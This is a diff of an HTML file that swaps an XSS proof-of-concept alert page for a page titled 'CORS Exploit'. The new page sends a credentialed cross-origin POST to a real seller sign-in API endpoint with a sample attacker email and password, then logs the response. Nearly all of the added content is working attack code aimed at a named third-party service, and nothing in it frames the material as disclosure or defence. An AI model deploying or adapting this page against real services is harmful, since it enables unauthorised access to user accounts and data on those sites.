@@ -1,13 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Proof of Concept</title>
+  <title>CORS Exploit</title>
 </head>
 <body>
-    <h1>This is the malicious file.</h1>
-    <script>
-        // This script will execute if the page is rendered.
-        alert('XSS Successful! Origin: ' + document.domain);
-    </script>
+  <script>
+    // Create a new XMLHttpRequest object
+    const xhr = new XMLHttpRequest();
+
+    // Set the request URL to the vulnerable API endpoint
+    xhr.open('POST', 'https://api.mydukaan.io/api/account/seller/email-sign-in/v2/', true);
+
+    // Set the request headers
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('X-Mode', 'seller-web');
+
+    // Set the request credentials
+    xhr.withCredentials = true;
+
+    // Send the request with a sample payload
+    xhr.send(JSON.stringify({ email: 'attacker@example.com', password: 'password' }));
+
+    // Log the response data to the console
+    xhr.onload = function() {
+      console.log(xhr.responseText);
+    };
+  </script>
 </body>
 </html>
